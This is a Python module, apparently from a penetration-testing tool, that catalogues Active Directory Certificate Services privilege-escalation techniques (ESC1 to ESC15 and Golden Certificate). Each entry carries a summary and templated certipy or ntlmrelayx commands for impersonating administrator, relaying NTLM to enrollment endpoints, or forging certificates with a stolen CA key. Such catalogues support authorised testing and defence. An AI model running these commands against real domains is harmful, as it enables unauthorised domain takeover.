from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class EscTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "adcs_esc"
    requires_external_listener: bool = False



ESC_TECHNIQUES: dict[str, EscTechnique] = {
    "esc1": EscTechnique(
        key="esc1",
        title="ESC1 — Enrollee supplies subject",
        severity="critical",
        mitre_id="T1649",
        summary="Template allows requesting a cert for arbitrary SAN + client authentication EKU.",
        manual_commands=(
            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template> "
            "-upn administrator@<DOMAIN>",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc2": EscTechnique(
        key="esc2",
        title="ESC2 — Any Purpose EKU",
        severity="critical",
        mitre_id="T1649",
        summary="Template has Any Purpose EKU (or no EKU) with enrollment rights.",
        manual_commands=("certipy req ... -template <Template>", "certipy auth -pfx ..."),
    ),
    "esc3": EscTechnique(
        key="esc3",
        title="ESC3 — Certificate Request Agent",
        severity="high",
        mitre_id="T1649",
        summary="Enrollment agent template + victim template chain for impersonation.",
        manual_commands=(
            "certipy req -template <AgentTemplate> -ca <CA>",
            "certipy req -template <VictimTemplate> -on-behalf-of <user> -pfx agent.pfx",
        ),
    ),
    "esc4": EscTechnique(
        key="esc4",
        title="ESC4 — Vulnerable template ACL",
        severity="high",
        mitre_id="T1649",
        summary="Write access on certificate template enables ESC1-style abuse.",
        manual_commands=(
            "certipy template -u user@<DOMAIN> -hashes :<NTLM> -template <Template> -save-old",
            "certipy template -u user@<DOMAIN> -hashes :<NTLM> -template <Template> -add-client-auth",
            "certipy req -ca <CA> -template <Template> -upn administrator@<DOMAIN>",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc6": EscTechnique(
        key="esc6",
        title="ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
        severity="critical",
        mitre_id="T1649",
        summary="CA allows requester to specify SAN in any template issued by this CA.",
        manual_commands=(
            "certipy req -u user -p pass -ca <CA> -template User "
            "-upn administrator@<DOMAIN>",
        ),
    ),
    "esc7": EscTechnique(
        key="esc7",
        title="ESC7 — Vulnerable CA ACL",
        severity="high",
        mitre_id="T1649",
        summary="ManageCA / ManageCertificates on CA enables template or cert abuse.",
        manual_commands=("certipy ca -ca <CA> -enable-template <Template>",),
    ),
    "esc8": EscTechnique(
        key="esc8",
        title="ESC8 — NTLM relay to HTTP enrollment",
        severity="critical",
        mitre_id="T1649",
        summary="Web enrollment accepts NTLM — relay to /certsrv/certfnsh.asp.",
        manual_commands=(
            "ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template <Template>",
            "coerce authentication to relay listener",
        ),
        requires_external_listener=True,
    ),
    "esc15": EscTechnique(
        key="esc15",
        title="ESC15 — Arbitrary application policy",
        severity="high",
        mitre_id="T1649",
        summary="Schema v2 template with arbitrary application policy OID.",
        manual_commands=("certipy req ... -application-policies 1.3.6.1.5.5.7.3.2",),
    ),
    "esc5": EscTechnique(
        key="esc5",
        title="ESC5 — Vulnerable PKI object ACL",
        severity="high",
        mitre_id="T1649",
        summary="Write access on AD CS container objects (NTAuthCertificates, PKI containers) enables CA/template manipulation.",
        manual_commands=(
            "certipy find -vulnerable -dc-ip <DC>",
            "# Modify NTAuthCertificates or PKI enrollment containers",
        ),
    ),
    "esc9": EscTechnique(
        key="esc9",
        title="ESC9 — No security extension (CT_FLAG_NO_SECURITY_EXTENSION)",
        severity="high",
        mitre_id="T1649",
        summary="Template omits szOID_NTDS_CA_SECURITY_EXT — with weak mapping (StrongCertificateBindingEnforcement=0), GenericWrite enables UPN spoofing.",
        manual_commands=(
            "certipy shadow auto -u user@<DOMAIN> -p pass -account <target>",
            "certipy req -u <target>@<DOMAIN> -hashes :<hash> -ca <CA> "
            "-template <Template> -upn administrator@<DOMAIN>",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc10": EscTechnique(
        key="esc10",
        title="ESC10 — Weak certificate mapping",
        severity="high",
        mitre_id="T1649",
        summary="Registry CertificateMappingMethods allows UPN-only mapping — UPN change + cert enrollment = impersonation.",
        manual_commands=(
            "# Change target's UPN to administrator@<DOMAIN>",
            "certipy req -u <target>@<DOMAIN> -hashes :<hash> -ca <CA> -template <Template>",
            "# Restore UPN, then auth with cert",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc11": EscTechnique(
        key="esc11",
        title="ESC11 — NTLM relay to RPC enrollment (MS-ICPR)",
        severity="high",
        mitre_id="T1649",
        summary="AD CS RPC interface (MS-ICPR) without IF_ENFORCEENCRYPTICERTREQUEST — relay NTLM to enroll certificates.",
        manual_commands=(
            "ntlmrelayx.py -t 'rpc://<CA>' --adcs --template <Template>",
            "coerce authentication to relay listener",
        ),
        requires_external_listener=True,
    ),

    "esc13": EscTechnique(
        key="esc13",
        title="ESC13 — Issuance policy OID group link",
        severity="high",
        mitre_id="T1649",
        summary="Certificate template with issuance policy OID linked to a group via msDS-OIDToGroupLink — enrollment grants effective group membership.",
        manual_commands=(
            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template>",
            "certipy auth -pfx <user>.pfx -dc-ip <DC>",
        ),
    ),
    "esc14": EscTechnique(
        key="esc14",
        title="ESC14 — Weak explicit certificate mapping",
        severity="medium",
        mitre_id="T1649",
        summary="Explicit altSecurityIdentities mapping on user objects — writable entries enable cert-based impersonation.",
        manual_commands=(
            "# Modify altSecurityIdentities on target to map attacker's cert",
            "certipy req -u user@<DOMAIN> -p pass -ca <CA> -template <Template>",
            "certipy auth -pfx <user>.pfx -dc-ip <DC>",
        ),
    ),
    "golden_cert": EscTechnique(
        key="golden_cert",
        title="Golden Certificate",
        severity="critical",
        mitre_id="T1649",
        summary="Forge TGTs with stolen CA private key (NTAUTH certificate).",
        manual_commands=(
            "certipy ca -backup -ca <CA>",
            "certipy forge -ca-pfx ca.pfx -upn administrator@<DOMAIN>",
        ),
        guide_key="golden_cert",
    ),
    "template_enrollment": EscTechnique(
        key="template_enrollment",
        title="Restricted template enrollment",
        severity="high",
        mitre_id="T1649",
        summary="Owned principal can enroll in a non-default template (e.g. via group membership).",
        manual_commands=(
            "certipy find -u user@<DOMAIN> -hashes :<NTLM> -dc-ip <DC> -vulnerable",
            "certipy req -u user@<DOMAIN> -hashes :<NTLM> -ca <CA> -template <Template> -dns <target>",
            "certipy auth -pfx <host>.pfx -dc-ip <DC>",
        ),
    ),
}


def esc_meta(key: str) -> EscTechnique:
    return ESC_TECHNIQUES.get(
        key,
        EscTechnique(
            key=key,
            title=key.upper(),
            severity="medium",
            mitre_id="T1649",
            summary=f"AD CS technique {key}",
            manual_commands=("guide adcs_esc",),
        ),
    )
